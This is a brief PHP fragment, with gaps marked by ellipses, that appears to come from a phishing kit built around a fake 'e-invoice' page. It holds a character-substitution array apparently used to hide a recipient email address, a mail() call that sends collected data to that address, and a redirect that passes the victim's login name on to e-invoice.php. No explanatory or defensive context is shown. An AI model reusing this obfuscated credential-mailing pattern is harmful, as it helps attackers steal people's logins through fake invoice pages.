...
$ar=array("0"=>"a","1"=>"b","2"=>"c","3"=>"d","4"=>"@","5"=>"M","6"=>"f","7"=>"g","8"=>".","9"=>"h","Q"=>"i","11"=>"j","12"=>"k","13"=>"X","14"=>"m","15"=>"n","16"=>"o","17"=>"p","18"=>"q","19"=>"r","20"=>"s","21"=>"t","22"=>"u","23"=>"v","24"=>"w","25"=>"x","26"=>"y","27"=>"z");
...
mail($recipient, $subj, $msg, $from);
	...
	header("Location: e-invoice.php?login=".$username."\n");
